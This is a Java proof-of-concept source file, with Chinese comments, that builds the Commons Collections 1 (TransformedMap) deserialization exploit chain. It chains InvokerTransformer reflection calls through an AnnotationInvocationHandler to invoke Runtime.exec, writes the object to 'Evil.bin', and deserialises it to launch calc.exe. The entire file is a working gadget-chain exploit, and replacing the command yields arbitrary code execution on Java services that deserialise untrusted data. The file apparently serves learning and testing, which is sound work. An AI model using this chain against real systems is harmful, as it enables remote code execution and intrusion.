package com.CommonsCollections;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class CC1_TransformedMap {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})
        };
        //将transformers数组存入ChaniedTransformer这个继承类
        Transformer transformerChain = new ChainedTransformer(transformers);

        //创建Map并绑定transformerChina
        Map innerMap = new HashMap();
        //给予map数据转化链
        innerMap.put("value","111");
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        // 触发方法1：往map中添加新值
//        outerMap.put("11", "1111");

        // 触发方法2：获取map键值对，修改(value，value)为(value，foobar)触发漏洞
//        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();
//        onlyElement.setValue("foobar");

        Class<?> cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> ctor = cl.getDeclaredConstructor(Class.class, Map.class);
        ctor.setAccessible(true);
        Object instance = ctor.newInstance(Target.class, outerMap);

        // 进行序列化
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("Evil.bin"));
        outputStream.writeObject(instance);
        outputStream.close();
        // 模拟后端接受到的序列化后的数据
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("Evil.bin"));
        inputStream.readObject();

    }
}

